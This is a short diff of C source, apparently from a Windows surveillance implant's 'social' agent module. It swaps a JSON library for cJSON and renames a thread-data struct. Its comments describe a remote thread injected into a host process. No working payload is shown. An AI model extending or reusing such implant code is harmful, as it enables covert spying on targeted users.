@@ -6,7 +6,7 @@
 #include "../../H4DLL/bss.h"
 #include "../../H4DLL/H4-DLL.h"
 #include "../../H4DLL/LOG.h"
-#include <json/JSON.h>
+#include <cJSON/cJSON.h>
 #include <rcs/bin_string.h>
 #include "../../H4DLL/AM_Core.h"
 #include "../../H4DLL/x64.h"
@@ -24,11 +24,12 @@ typedef struct {
 	char cDLLHookName[DLLNAMELEN];	// Nome della dll principal
 	char cSocialMainLoop[64];          // Nome della funzione "social"
 	ExitProcess_T pExitProcess;
-} SocialThreadDataStruct;
-SocialThreadDataStruct SocialThreadData;
+} SOCIAL_THREAD_DATA;
+
+SOCIAL_THREAD_DATA SocialThreadData;
 
 // Thread remoto iniettato nel processo Social host
-DWORD Social_HostThread(SocialThreadDataStruct *pDataThread)
+DWORD Social_HostThread(SOCIAL_THREAD_DATA *pDataThread)
 {
 	HMODULE hMainDLL;
 	Social_MainLoop_t pSocial_MainLoop;
@@ -165,7 +166,7 @@ DWORD WINAPI PM_SocialAgentUnregister()
 	return 1;
 }
 
-DWORD WINAPI PM_SocialAgentInit(JSONObject elem)
+DWORD WINAPI PM_SocialAgentInit(cJSON* elem)
 {
 	// Segnala l'agent manager che questo agente e' sempre attivo. In questo modo verro' PM_SocialAgentStartStop verra' 
 	// chiamata quando sara' necessario mettere in pausa l'agente
